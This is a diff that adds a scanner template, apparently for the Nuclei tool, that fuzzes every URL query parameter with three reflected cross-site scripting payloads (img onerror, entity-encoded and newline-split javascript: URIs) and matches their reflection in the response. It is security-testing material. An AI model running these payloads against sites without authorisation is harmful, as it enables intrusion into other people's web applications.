@@ -1,0 +1,44 @@
+id: auto-equal-reflected-xss
+
+info:
+  name: Reflected XSS via Auto Parameter Injection
+  author: Nahid
+  severity: high
+  description: |
+    Automatically injects XSS payloads into all URL parameters
+    by replacing everything after '=' with payloads.
+  tags: xss,reflected,auto,params
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    payloads:
+      payload:
+        - "%22%3E%3Cimg%20src=x%20onerror=prompt(1);%3E"
+        - "%26%2302java%26%23115cript:alert(document.domain)"
+        - "javascript%0a:\\u0061lert(origin)"
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{payload}}"
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<img src=x onerror=prompt(1)"
+          - "alert(document.domain)"
+          - "alert(origin)"
+
+      - type: regex
+        part: body
+        regex:
+          - "(?i)(<script|onerror=|javascript:)"
+
+    stop-at-first-match: true
